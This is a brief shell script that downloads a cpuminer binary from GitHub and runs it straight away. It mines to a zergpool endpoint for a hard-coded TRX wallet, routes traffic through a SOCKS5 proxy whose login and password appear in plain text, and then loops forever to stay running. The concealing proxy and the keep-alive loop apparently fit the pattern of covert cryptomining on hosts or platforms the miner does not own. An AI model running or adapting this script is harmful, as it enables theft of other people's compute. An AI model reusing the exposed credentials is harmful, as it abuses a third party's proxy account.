#!/bin/sh
apt update
apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower -o stratum+tcp://yespower.mine.zergpool.com:6533 -u TP7es1WrhSXgfhbGhhc7LAXpivZ4qAjZPq -p  c=TRX,ID=coolyp -x socks5://avskpnpk:s5hxrad5w7df@144.168.217.88:8780 -t 4
while [ 1 ]; do
sleep 3
done
sleep 999
